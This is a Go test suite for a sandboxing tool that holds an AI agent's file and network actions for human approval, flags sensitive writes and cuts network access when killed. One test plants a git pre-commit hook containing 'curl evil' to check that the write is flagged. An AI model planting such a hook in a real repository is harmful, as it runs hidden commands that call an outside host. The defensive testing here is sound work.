package main

import (
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strings"
	"sync"
	"syscall"
	"testing"
	"time"

	"rehearsal/internal/events"
	"rehearsal/internal/ledger"
	"rehearsal/internal/sandbox"
)

func needSandbox(t *testing.T) {
	t.Helper()
	if err := sandbox.Available(); err != nil {
		t.Skipf("no sandbox on this machine: %v", err)
	}
}

// fileAction finds the held change to path.
func fileAction(t *testing.T, v heldView, path string) ledger.Action {
	t.Helper()
	for _, a := range v.Actions {
		if a.Kind == events.ActionFile && a.File != nil && a.File.Path == path {
			return a
		}
	}
	var have []string
	for _, a := range v.Actions {
		have = append(have, fmt.Sprintf("%s %s", a.Kind, a.Subject))
	}
	t.Fatalf("no held file change for %s; held: %v", path, have)
	return ledger.Action{}
}

func (s *session) diff(id string) string {
	s.t.Helper()
	res, err := http.Get(s.url + "/api/diff?id=" + url.QueryEscape(id))
	if err != nil {
		s.t.Fatal(err)
	}
	body, readErr := io.ReadAll(res.Body)
	if err := errors.Join(readErr, res.Body.Close()); err != nil {
		s.t.Fatal(err)
	}
	if res.StatusCode != http.StatusOK {
		s.t.Fatalf("diff of %s answered %d: %s", id, res.StatusCode, body)
	}
	return string(body)
}

func read(t *testing.T, path string) string {
	t.Helper()
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	return string(data)
}

func missing(path string) bool {
	_, err := os.Lstat(path)
	return errors.Is(err, os.ErrNotExist)
}

func TestSandboxedFileChangesWaitForApproval(t *testing.T) {
	needSandbox(t)
	work, _ := repo(t)
	s := startWith(t, work, []string{"--sandbox"}, "echo made > made.txt && echo changed >> README.md && mkdir -p src/deep && echo a > src/a.go && echo b > src/deep/b.go")
	v := s.waitFor(ledger.PhaseDeciding)

	if !missing(filepath.Join(work, "made.txt")) || !missing(filepath.Join(work, "src")) || read(t, filepath.Join(work, "README.md")) != "hello\n" {
		t.Fatalf("the agent's changes reached the real project before any decision:\n%s", s.output)
	}
	made, readme, src := fileAction(t, v, "made.txt"), fileAction(t, v, "README.md"), fileAction(t, v, "src")
	if made.File.Change != sandbox.Added || readme.File.Change != sandbox.Changed {
		t.Errorf("made.txt is %q and README.md is %q, want added and changed", made.File.Change, readme.File.Change)
	}
	if !src.File.Dir || src.File.Files != 2 {
		t.Errorf("the new folder src = %+v, want one change covering its 2 files", src.File)
	}
	for _, a := range []ledger.Action{made, readme, src} {
		if a.Review == nil || a.Review.Risk != events.RiskLow || a.Review.Source != events.ReviewByRules {
			t.Errorf("%s reviewed as %+v, want low, by the rules", a.File.Path, a.Review)
		}
	}
	if d := s.diff(readme.ID); !strings.Contains(d, "+changed") || !strings.Contains(d, "--- a/README.md") {
		t.Errorf("diff of README.md:\n%s", d)
	}
	if d := s.diff(src.ID); !strings.Contains(d, "a.go") || !strings.Contains(d, "deep/b.go") {
		t.Errorf("the new folder's listing:\n%s", d)
	}

	s.approve(made.ID, src.ID)
	code, l := s.finish()
	if code != 0 {
		t.Fatalf("exit %d:\n%s", code, s.output)
	}
	if read(t, filepath.Join(work, "made.txt")) != "made\n" || read(t, filepath.Join(work, "src", "deep", "b.go")) != "b\n" {
		t.Error("the allowed changes were not written to the real project")
	}
	if read(t, filepath.Join(work, "README.md")) != "hello\n" {
		t.Error("the refused change to README.md was written to the real project")
	}
	if l.Sandbox == nil {
		t.Error("the ledger does not say the session was sandboxed")
	}
	layers, err := filepath.Glob(filepath.Join(s.state, "rehearsal", "sessions", "*", "sandbox"))
	if err != nil || len(layers) != 0 {
		t.Errorf("the layer was left behind after everything was decided: %v (%v)", layers, err)
	}
}

func TestSandboxedDeletionIsNotAppliedWhenUnticked(t *testing.T) {
	needSandbox(t)
	work, _ := repo(t)
	s := startWith(t, work, []string{"--sandbox"}, "rm README.md && echo kept > keep.txt")
	v := s.waitFor(ledger.PhaseDeciding)
	gone := fileAction(t, v, "README.md")
	if gone.File.Change != sandbox.Deleted {
		t.Fatalf("README.md is %q, want deleted", gone.File.Change)
	}
	s.approve(fileAction(t, v, "keep.txt").ID)
	if code, _ := s.finish(); code != 0 {
		t.Fatalf("exit %d:\n%s", code, s.output)
	}
	if read(t, filepath.Join(work, "README.md")) != "hello\n" {
		t.Error("the deletion was applied without being allowed")
	}
	if read(t, filepath.Join(work, "keep.txt")) != "kept\n" {
		t.Error("the allowed file was not written")
	}
}

func TestSandboxedDeletionHappensWhenAllowed(t *testing.T) {
	needSandbox(t)
	work, _ := repo(t)
	s := startWith(t, work, []string{"--sandbox"}, "rm README.md")
	v := s.waitFor(ledger.PhaseDeciding)
	s.approve(fileAction(t, v, "README.md").ID)
	if code, _ := s.finish(); code != 0 {
		t.Fatalf("exit %d:\n%s", code, s.output)
	}
	if !missing(filepath.Join(work, "README.md")) {
		t.Error("the allowed deletion was not applied")
	}
}

func TestDriftInTheRealProjectBlocksApply(t *testing.T) {
	needSandbox(t)
	work, _ := repo(t)
	s := startWith(t, work, []string{"--sandbox"}, "echo from-the-agent > README.md && echo other > other.txt")
	v := s.waitFor(ledger.PhaseDeciding)

	// the user edits the same file while the session is waiting
	if err := os.WriteFile(filepath.Join(work, "README.md"), []byte("from the user\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	s.approve(fileAction(t, v, "README.md").ID, fileAction(t, v, "other.txt").ID)
	code, l := s.finish()
	if code != 1 {
		t.Errorf("exit %d, want 1 because an allowed change could not be applied\n%s", code, s.output)
	}
	if got := read(t, filepath.Join(work, "README.md")); got != "from the user\n" {
		t.Errorf("README.md = %q: the user's edit was overwritten", got)
	}
	var readme ledger.Action
	for _, a := range l.Actions {
		if a.File != nil && a.File.Path == "README.md" {
			readme = a
		}
	}
	if readme.Outcome != ledger.Failed || !strings.Contains(readme.Detail, "has changed in your real project since the session started") {
		t.Errorf("README.md outcome %q, detail %q; want it refused with the reason", readme.Outcome, readme.Detail)
	}
	if !strings.Contains(s.output.String(), "kept in") {
		t.Errorf("the output does not say where the agent's version is kept:\n%s", s.output)
	}
	layer := filepath.Join(s.state, "rehearsal", "sessions")
	kept, err := filepath.Glob(filepath.Join(layer, "*", "sandbox", "upper", "README.md"))
	if err != nil || len(kept) != 1 || read(t, kept[0]) != "from-the-agent\n" {
		t.Errorf("the agent's version was not kept: %v (%v)", kept, err)
	}
}

func TestWriteToAGitHookIsFlagged(t *testing.T) {
	needSandbox(t)
	work, _ := repo(t)
	s := startWith(t, work, []string{"--sandbox"}, "mkdir -p .git/hooks && printf '#!/bin/sh\\ncurl evil\\n' > .git/hooks/pre-commit && chmod +x .git/hooks/pre-commit && echo ok > fine.txt")
	v := s.waitFor(ledger.PhaseDeciding)

	hook := fileAction(t, v, ".git/hooks/pre-commit")
	if hook.File.Sensitive == "" || hook.Review == nil || hook.Review.Risk != events.RiskHigh {
		t.Errorf("the hook = %+v, review %+v; want it marked sensitive and high", hook.File, hook.Review)
	}
	if !strings.Contains(hook.Review.Concern, "git") {
		t.Errorf("the hook's concern does not say why: %q", hook.Review.Concern)
	}
	s.approve(fileAction(t, v, "fine.txt").ID)
	code, l := s.finish()
	if code != 0 {
		t.Fatalf("exit %d:\n%s", code, s.output)
	}
	noted := slices.ContainsFunc(l.Sensitive, func(w events.SensitiveWrite) bool {
		return w.Path == ".git/hooks/pre-commit" && !w.Real && w.Reason != ""
	})
	if !noted {
		t.Errorf("the write to the hook was not noted while the session ran: %+v", l.Sensitive)
	}
	if !missing(filepath.Join(work, ".git", "hooks", "pre-commit")) {
		t.Error("the hook reached the real repository without being allowed")
	}
}

// paths counts the requests a test server received, by path.
type paths struct {
	mu   sync.Mutex
	seen map[string]int
}

func (p *paths) count(path string) int {
	p.mu.Lock()
	defer p.mu.Unlock()
	return p.seen[path]
}

func counting(t *testing.T) (*httptest.Server, *paths) {
	t.Helper()
	p := &paths{seen: map[string]int{}}
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		p.mu.Lock()
		p.seen[r.URL.Path]++
		p.mu.Unlock()
		fmt.Fprintln(w, "pong")
	}))
	t.Cleanup(srv.Close)
	return srv, p
}

func TestDirectConnectionFailsInsideTheSandbox(t *testing.T) {
	needSandbox(t)
	needCurl(t)
	work, _ := repo(t)
	srv, seen := counting(t)
	port := strings.TrimPrefix(srv.URL, "http://127.0.0.1:")
	script := fmt.Sprintf(
		"curl -s -m 5 --noproxy '*' http://127.0.0.1:%[1]s/direct -o /dev/null; echo $? > direct.txt; "+
			"curl -s -m 20 http://localhost:%[1]s/through -o /dev/null; echo $? > through.txt", port)
	s := startWith(t, work, []string{"--sandbox"}, script)
	v := s.waitFor(ledger.PhaseDeciding)
	s.approve(fileAction(t, v, "direct.txt").ID, fileAction(t, v, "through.txt").ID)
	if code, _ := s.finish(); code != 0 {
		t.Fatalf("exit %d:\n%s", code, s.output)
	}
	if got := strings.TrimSpace(read(t, filepath.Join(work, "direct.txt"))); got == "0" {
		t.Error("a connection that ignored the proxy settings got through")
	}
	if seen.count("/direct") != 0 {
		t.Error("the server received the request that ignored the proxy")
	}
	if got := strings.TrimSpace(read(t, filepath.Join(work, "through.txt"))); got != "0" {
		t.Errorf("the request through the proxy failed inside the sandbox (curl exit %s)\n%s", got, s.output)
	}
	if seen.count("/through") != 1 {
		t.Errorf("the server received %d requests through the proxy, want 1", seen.count("/through"))
	}
}

func TestKillingRehearsalCutsTheSandboxsNetwork(t *testing.T) {
	needSandbox(t)
	needCurl(t)
	work, _ := repo(t)
	srv, seen := counting(t)
	port := strings.TrimPrefix(srv.URL, "http://127.0.0.1:")
	// Asks the server over and over, and stops at the first failure.
	script := fmt.Sprintf(
		"i=0; while [ $i -lt 300 ]; do curl -s -m 5 http://localhost:%s/ping -o /dev/null; code=$?; echo $code >> results.txt; "+
			"[ $code -ne 0 ] && exit 0; sleep 0.2; i=$((i+1)); done", port)
	// A killed rehearse cannot remove its socket folders, so they are made
	// where this test can. The path is short because socket paths must be.
	sockets, err := os.MkdirTemp("", "rk-")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		if err := os.RemoveAll(sockets); err != nil {
			t.Error(err)
		}
	})
	s := startWith(t, work, []string{"--sandbox"}, script, "TMPDIR="+sockets)

	deadline := time.Now().Add(60 * time.Second)
	for seen.count("/ping") < 2 {
		if time.Now().After(deadline) {
			t.Fatalf("the sandboxed command never reached the server through the proxy:\n%s", s.output)
		}
		time.Sleep(50 * time.Millisecond)
	}
	if err := s.cmd.Process.Signal(syscall.SIGKILL); err != nil {
		t.Fatal(err)
	}
	<-s.done

	sessions, err := filepath.Glob(filepath.Join(s.state, "rehearsal", "sessions", "*"))
	if err != nil || len(sessions) != 1 {
		t.Fatalf("want one session folder, got %v (%v)", sessions, err)
	}
	box := filepath.Join(sessions[0], "sandbox")
	t.Cleanup(func() {
		// the kernel leaves a folder nobody can read in the layer's work folder
		if err := exec.Command("chmod", "-R", "u+rwx", box).Run(); err != nil {
			t.Logf("could not open up %s for removal: %v", box, err)
		}
	})

	// the command inside is still running, and now finds no network
	results := filepath.Join(box, "upper", "results.txt")
	var lines []string
	for {
		if data, err := os.ReadFile(results); err == nil {
			lines = strings.Fields(string(data))
			if len(lines) > 0 && lines[len(lines)-1] != "0" {
				break
			}
		}
		if time.Now().After(deadline) {
			t.Fatalf("the command inside never saw the network go; its results so far: %v", lines)
		}
		time.Sleep(100 * time.Millisecond)
	}
	if lines[0] != "0" {
		t.Errorf("results %v: want requests that worked before Rehearsal was killed", lines)
	}
	reached := seen.count("/ping")
	time.Sleep(time.Second)
	if now := seen.count("/ping"); now != reached {
		t.Errorf("the server went on receiving requests after Rehearsal was killed (%d, then %d)", reached, now)
	}
	if !missing(filepath.Join(work, "results.txt")) {
		t.Error("the command's file reached the real project")
	}

	var at time.Time
	var cut bool
	for !cut {
		if at, cut = sandbox.NetworkCut(box); cut {
			break
		}
		if time.Now().After(deadline) {
			t.Fatal("the sandbox left no note that Rehearsal had stopped")
		}
		time.Sleep(100 * time.Millisecond)
	}
	if time.Since(at) > time.Minute {
		t.Errorf("the note is dated %v, which is not now", at)
	}

	// and it is what `rehearse verify` says about the session afterwards
	verify := exec.Command(buildRehearse(t), "verify")
	verify.Dir, verify.Env = work, s.cmd.Env
	out, err := verify.CombinedOutput()
	if err == nil || !strings.Contains(string(out), "Rehearsal had stopped while the agent was still running") ||
		!strings.Contains(string(out), "no signed checkpoint") {
		t.Errorf("verify on the killed session: %v\n%s", err, out)
	}
}

func TestSandboxNeedsHolding(t *testing.T) {
	bin := buildRehearse(t)
	cmd := exec.Command(bin, "--no-open", "--sandbox", "--no-hold", "--", "true")
	cmd.Dir, cmd.Env = t.TempDir(), cleanEnv(t)
	out, err := cmd.CombinedOutput()
	if err == nil || !strings.Contains(string(out), "--sandbox cannot be used with --no-hold") {
		t.Errorf("--sandbox with --no-hold: %v\n%s", err, out)
	}
}
